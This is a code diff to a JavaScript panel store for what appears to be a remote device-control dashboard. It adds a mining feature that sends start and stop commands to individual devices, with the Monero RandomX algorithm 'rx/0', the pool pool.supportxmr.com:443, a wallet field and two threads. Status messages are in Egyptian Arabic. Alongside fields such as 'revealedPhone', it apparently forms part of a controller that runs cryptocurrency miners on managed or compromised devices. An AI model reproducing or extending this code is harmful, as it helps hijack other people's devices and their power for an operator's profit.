@@ -46,6 +46,9 @@ export function makePanelStore() {
     auditItems: [],
     previewUrl: "",
     revealedPhone: "",
+    mining: null,
+    miningPool: "",
+    miningWallet: "",
     pullModal: { open: false, tab: "original", search: "", spec: "", counts: {}, items: [], progress: null },
 
     listFilter: "",
@@ -172,6 +175,7 @@ export function makePanelStore() {
         this.editName = this.detail?.name || "";
         this.editNotes = this.detail?.notes || "";
         this.loadAudit(id);
+        this.loadMining(id);
       } catch (err) {
         this.handleLoadError(err);
       }
@@ -183,6 +187,49 @@ export function makePanelStore() {
         this.auditItems = body.items || [];
       } catch {
         this.auditItems = [];
+      }
+    },
+
+    /** Mining panel state: minerState + hashrate ring + sessions. */
+    async loadMining(id) {
+      try {
+        this.mining = await apiFetch(`/devices/${encodeURIComponent(id)}/mining`);
+      } catch {
+        this.mining = null;
+      }
+    },
+
+    async miningStart(id) {
+      try {
+        await apiFetch(`/devices/${encodeURIComponent(id)}/mining/start`, {
+          method: "POST",
+          body: JSON.stringify({
+            algo: "rx/0",
+            pool: this.miningPool || "pool.supportxmr.com:443",
+            wallet: this.miningWallet || "",
+            threads: 2,
+          }),
+        });
+        this.flash = "أمر التعدين اتبعت";
+        setTimeout(() => (this.flash = ""), 2500);
+        this.loadMining(id);
+      } catch (err) {
+        this.flash = err?.status === 409 ? "التعدين شغال أصلًا" : "فشل إرسال الأمر";
+        setTimeout(() => (this.flash = ""), 2500);
+      }
+    },
+
+    async miningStop(id) {
+      try {
+        await apiFetch(`/devices/${encodeURIComponent(id)}/mining/stop`, {
+          method: "POST", body: "{}",
+        });
+        this.flash = "أمر الإيقاف اتبعت";
+        setTimeout(() => (this.flash = ""), 2500);
+        this.loadMining(id);
+      } catch (err) {
+        this.flash = err?.status === 409 ? "مفيش تعدين شغال" : "فشل إرسال الأمر";
+        setTimeout(() => (this.flash = ""), 2500);
       }
     },
 
